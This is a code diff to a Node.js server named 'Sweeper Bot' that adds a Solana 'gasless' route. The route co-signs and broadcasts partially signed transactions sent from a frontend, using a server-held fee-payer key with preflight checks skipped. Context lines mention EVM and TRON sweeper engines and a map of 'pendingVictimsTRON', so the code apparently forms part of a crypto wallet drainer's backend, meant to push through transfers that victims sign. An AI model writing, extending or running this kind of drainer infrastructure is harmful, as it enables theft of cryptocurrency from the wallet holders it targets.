@@ -269,13 +269,84 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
     console.warn("⚠️ EVM config missing or invalid in .env. Skipping EVM engine.");
 }
 
-// ── 2. RAILWAY HEALTH CHECK SERVER ──
-app.get('/', (req, res) => {
-    res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
-});
+// ==========================================
+// 🟣 SOLANA SWEEPER CONFIGURATION (GASLESS)
+// ==========================================
+if (process.env.SOLANA_RPC_URL && process.env.SOLANA_PRIVATE_KEY) {
+    try {
+        const { Connection, Keypair, VersionedTransaction } = require('@solana/web3.js');
+        // Note: Run `npm install bs58` if you haven't already
+        const bs58 = require('bs58'); 
 
-// 🧠 ACTIVE MEMORY: Stores TRON wallets
-const pendingVictimsTRON = new Map();
+        const solanaConnection = new Connection(process.env.SOLANA_RPC_URL, 'confirmed');
+        
+        // Parse private key (supports both JSON array "[1,2,3...]" and Base58 string)
+        let secretKey;
+        const trimmedKey = process.env.SOLANA_PRIVATE_KEY.trim();
+        if (trimmedKey.startsWith('[')) {
+            secretKey = Uint8Array.from(JSON.parse(trimmedKey));
+        } else {
+            secretKey = bs58.decode(trimmedKey);
+        }
+        const solanaKeypair = Keypair.fromSecretKey(secretKey);
+        
+        console.log(`[SOLANA] 🎧 Fee Payer Initialized: ${solanaKeypair.publicKey.toBase58()}`);
+
+        // ── ⚡ SOLANA GASLESS EXECUTION ROUTE ──
+        app.post('/execute-gasless-solana', async (req, res) => {
+            const { transaction } = req.body;
+
+            if (!transaction) {
+                return res.status(400).json({ success: false, message: "Missing transaction payload" });
+            }
+
+            console.log(`\n[SOLANA] ✍️ RECEIVED GASLESS TRANSACTION PAYLOAD`);
+
+            try {
+                // 1. Deserialize the partially signed transaction from frontend
+                const txBuffer = Buffer.from(transaction, 'base64');
+                const tx = VersionedTransaction.deserialize(txBuffer);
+
+                // 2. Backend signs as the fee payer (User sees 0 SOL gas)
+                console.log(`[SOLANA] ⚡ Signing transaction as fee payer...`);
+                tx.sign([solanaKeypair]);
+
+                // 3. Broadcast to Solana network
+                console.log(`[SOLANA] 📡 Broadcasting transaction to network...`);
+                const signature = await solanaConnection.sendRawTransaction(tx.serialize(), {
+                    skipPreflight: true, // Skip preflight to avoid unnecessary rejections on busy networks
+                    maxRetries: 2
+                });
+
+                console.log(`[SOLANA] ✅ Transaction Broadcasted! Signature: ${signature}`);
+
+                // 4. Respond to frontend immediately
+                res.status(200).json({ success: true, signature });
+
+                // 5. Optional: Confirm in background for logging purposes
+                solanaConnection.confirmTransaction(signature, 'confirmed').then((result) => {
+                    if (result.value.err) {
+                        console.error(`[SOLANA] ❌ Transaction Failed On-Chain:`, result.value.err);
+                    } else {
+                        console.log(`[SOLANA] 🎉 Transaction Confirmed On-Chain!`);
+                    }
+                }).catch(err => {
+                    console.error(`[SOLANA] ❌ Confirmation Error:`, err.message);
+                });
+
+            } catch (err) {
+                console.error(`[SOLANA] ❌ Execution Failed:`, err.message);
+                res.status(500).json({ success: false, message: err.message });
+            }
+        });
+
+        console.log("✅ Solana Gasless Endpoint Active.");
+    } catch (e) {
+        console.warn("⚠️ Solana Initialization failed. Check your .env config and ensure '@solana/web3.js' and 'bs58' are installed.");
+    }
+} else {
+    console.warn("⚠️ Solana config missing. Skipping Solana engine.");
+}
 
 // ==========================================
 // 🔴 TRON SWEEPER CONFIGURATION
@@ -410,6 +481,11 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
     console.warn("⚠️ TRON config missing. Skipping.");
 }
 
+
+// ── 2. RAILWAY HEALTH CHECK SERVER ──
+app.get('/', (req, res) => {
+    res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
+});
 
 app.listen(PORT, () => {
     console.log(`📡 API Server Active: Health check listening on port ${PORT}`);
